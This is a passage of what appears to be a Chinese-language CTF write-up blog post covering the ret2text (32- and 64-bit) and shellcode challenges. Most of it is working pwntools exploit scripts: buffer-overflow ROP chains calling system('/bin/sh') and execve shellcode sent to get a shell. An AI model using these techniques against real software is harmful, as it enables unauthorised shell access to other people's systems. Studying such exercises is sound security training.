<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">57743</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bin_sh=<span class="number">0x0804c02c</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;age?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow!&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">92</span>+p32(system_plt)+<span class="string">b&#x27;xxxx&#x27;</span>+p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ret2text-64"><a href="#ret2text-64" class="headerlink" title="ret2text_64"></a>ret2text_64</h1><p>就是把上一题的32位脚本换成64位，注意寄存器传参和栈对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">57045</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh=<span class="number">0x0404050</span></span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">pop_rdi=<span class="number">0x04011be</span></span><br><span class="line">ret_addr=<span class="number">0x040101a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;age?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;overflow!&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">88</span>+p64(pop_rdi)+p64(bin_sh)+p64(ret_addr)+p64(system_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="shellcode-level1-md"><a href="#shellcode-level1-md" class="headerlink" title="shellcode_level1.md"></a>shellcode_level1.md</h1><p><code>int mprotect(const void *addr, size_t len, int prot);</code></p>
<p><code>addr</code>：指向内存的指针</p>
<p><code>len</code>：区域大小</p>
<p><code>port</code>：修改的属性，<code>PROT_READ</code>（值为 1）：内存区域可读。<code>PROT_WRITE</code>（值为 2）：内存区域可写。<code>PROT_EXEC</code>（值为 4）：内存区域可执行。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;choose?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;write?&#x27;</span>)</span><br><span class="line">p.sendline(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="shellcode-level2"><a href="#shellcode-level2" class="headerlink" title="shellcode_level2"></a>shellcode_level2</h1><p>再call rdx之前多了一个判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000123C 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000001240 0F B6 00                      movzx   eax, byte ptr [rax]</span><br><span class="line">.text:0000000000001243 84 C0                         test    al, al                          ; 把两个数进行逻辑与操作，结果存在ZF中，故s第一个为00</span><br><span class="line">.text:0000000000001245 74 16                         jz      short loc_125D                  ; 需要让标志位寄存器为0</span><br><span class="line">.text:0000000000001245</span><br><span class="line">.text:0000000000001247 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:000000000000124B BA 64 00 00 00                mov     edx, 64h ; &#x27;d&#x27;                  ; n</span><br><span class="line">.text:0000000000001250 BE 00 00 00 00                mov     esi, 0                          ; c</span><br><span class="line">.text:0000000000001255 48 89 C7                      mov     rdi, rax                        ; s</span><br><span class="line">.text:0000000000001258 E8 43 FE FF FF                call    _memset</span><br><span class="line">.text:0000000000001258</span><br><span class="line">.text:000000000000125D</span><br><span class="line">.text:000000000000125D                               loc_125D:                               ; CODE XREF: main+9C↑j</span><br><span class="line">.text:000000000000125D 48 8D 45 90                   lea     rax, [rbp+s]</span><br><span class="line">.text:0000000000001261 48 83 C0 01                   add     rax, 1</span><br><span class="line">.text:0000000000001265 48 89 45 88                   mov     [rbp+var_78], rax</span><br><span class="line">.text:0000000000001269 48 8B 55 88                   mov     rdx, [rbp+var_78]</span><br><span class="line">.text:000000000000126D B8 00 00 00 00                mov     eax, 0</span><br><span class="line">.text:0000000000001272 FF D2                         call    rdx</span><br></pre></td></tr></table></figure>

<p>如果ZF为0才会跳转到call rdx，跳转前有一个<code>test al,al</code>。test做逻辑与的操作，要让ZF为0，则al为00，即输入第一个字节为00.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">push rdx;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rax,0x68732f2f6e69622f;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">mov rax,59;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x00&#x27;</span>+asm(shellcode).ljust(<span class="number">0x64</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/11/09/SHCTFWP/" rel="prev" title="SHCTFWP">
      <i class="fa fa-chevron-left"></i> SHCTFWP
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#baby-calculator"><span class="nav-number">1.</span> <span class="nav-text">baby_calculator</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#changeable-shellcode"><span class="nav-number">2.</span> <span class="nav-text">changeable_shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fd"><span class="nav-number">3.</span> <span class="nav-text">fd</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#format-level0"><span class="nav-number">4.</span> <span class="nav-text">format_level0</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#format-level1"><span class="nav-number">5.</span> <span class="nav-text">format_level1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#int-overflow"><span class="nav-number">6.</span> <span class="nav-text">int_overflow</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#little-canary"><span class="nav-number">7.</span> <span class="nav-text">little_canary</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PIE-enabled"><span class="nav-number">8.</span> <span class="nav-text">PIE_enabled</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#rePWNse"><span class="nav-number">9.</span> <span class="nav-text">rePWNse</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc"><span class="nav-number">10.</span> <span class="nav-text">ret2libc</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">11.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text-32"><span class="nav-number">12.</span> <span class="nav-text">ret2text_32</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text-64"><span class="nav-number">13.</span> <span class="nav-text">ret2text_64</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode-level1-md"><span class="nav-number">14.</span> <span class="nav-text">shellcode_level1.md</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#shellcode-level2"><span class="nav-number">15.</span> <span class="nav-text">shellcode_level2</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">John Doe</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
